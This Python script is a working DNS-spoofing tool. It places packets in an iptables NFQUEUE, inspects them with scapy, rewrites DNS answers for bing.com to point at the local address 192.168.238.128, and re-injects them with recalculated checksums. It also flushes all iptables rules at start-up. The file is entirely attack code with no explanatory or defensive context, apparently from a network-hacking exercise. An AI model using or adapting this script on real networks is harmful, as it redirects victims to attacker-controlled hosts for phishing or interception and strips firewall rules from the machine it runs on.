import netfilterqueue as nfq
from netfilterqueue import Packet
import subprocess
import scapy.all as scapy


def redirect_local(queue_num: int) -> None:
	subprocess.call(
		f"iptables -I INPUT -j NFQUEUE --queue-num {queue_num}",
		shell=True,
	)
	subprocess.call(
		f"iptables -I OUTPUT -j NFQUEUE --queue-num {queue_num}",
		shell=True,
	)

def redirect_queue(queue_num: int) -> None:
	subprocess.call(
		f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}",
		shell=True,
	)

def restore_flow():
	subprocess.call("iptables --flush", shell=True)

def manipulate_packet_queue(queue_num: int, func: callable):
	queue = nfq.NetfilterQueue()  		  # create a queue object
	queue.bind(queue_num, func) # bind to iptables queue
	queue.run()							  # run modifications


SPOOF_SITE = b"bing.com"
SPOOF_IP = "192.168.238.128"

def process_packet(packet: Packet) -> None:
	# convert NFQ packet to scapy
	scapy_packet = scapy.IP(packet.get_payload())
	# check packet for DNS response
	if scapy_packet.haslayer(scapy.DNSRR):
		# check packet for target website in DNS request
		qname = scapy_packet[scapy.DNSQR].qname
		if SPOOF_SITE in qname:
			# create modified DNS reponse
			answer = scapy.DNSRR(rrname=qname, rdata=SPOOF_IP)
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			# delete verification fields
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			# fields will be recalculated
			# print modified packet
			print(scapy_packet.show())
			# return modified scapy packet to NFQ packet
			packet.set_payload(bytes(scapy_packet))
	# NFQ send out the modified packet
	packet.accept()


if __name__ == "__main__":
	restore_flow()
	redirect_local(queue_num=0)
	manipulate_packet_queue(queue_num=0, func=process_packet)
